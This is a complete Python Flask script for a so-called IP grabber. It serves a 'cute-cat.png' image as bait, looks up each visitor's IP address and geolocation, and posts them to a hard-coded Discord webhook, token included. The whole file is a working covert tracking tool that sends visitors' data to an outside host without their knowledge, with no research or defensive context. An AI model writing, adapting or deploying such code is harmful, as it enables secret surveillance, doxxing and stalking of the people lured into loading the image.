from flask import Flask, request, send_file
import requests

print("🚀 Flask server started...")

app = Flask(__name__)

webhook_url = "https://discordapp.com/api/webhooks/1359476486599475300/lPlfpFf4XVEeY6qyEFfF6CDU5LhfzK1VPknrUA2CNU5hXNNmIKlOL913qMUzvf2Op4bw"  # 👈 Replace with your actual webhook

def get_ip_location(ip):
    try:
        res = requests.get(f"http://ip-api.com/json/{ip}")
        data = res.json()
        if data['status'] == 'success':
            lat = data.get('lat', '')
            lon = data.get('lon', '')
            map_link = f"https://www.google.com/maps?q={lat},{lon}"
            return f"{data.get('city')}, {data.get('regionName')}, {data.get('country')}\n🗺️ [Map Link]({map_link})"
        else:
            return "Location not found"
    except Exception as e:
        return f"Error fetching location: {e}"

def send_ip_to_discord(ip):
    location = get_ip_location(ip)
    message = f"📥 New visitor IP: `{ip}`\n📍 Location: {location}"
    try:
        r = requests.post(webhook_url, json={"content": message})
        print(f"[✅] Sent IP to Discord: {ip} | Status: {r.status_code}")
    except Exception as e:
        print(f"[❌] Failed to send to Discord: {e}")

@app.route('/cute-cat.png')
def grab_ip_and_serve_image():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    print(f"[📡] Incoming IP: {ip}")
    send_ip_to_discord(ip)

    try:
        print("[📤] Sending image...")
        return send_file("cute-cat.jpg", mimetype="image/jpeg")
    except Exception as e:
        print(f"[❌] Failed to send image: {e}")
        return "Image not found", 404

@app.route('/')
def home():
    return "✅ IP grabber is live"

import os

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
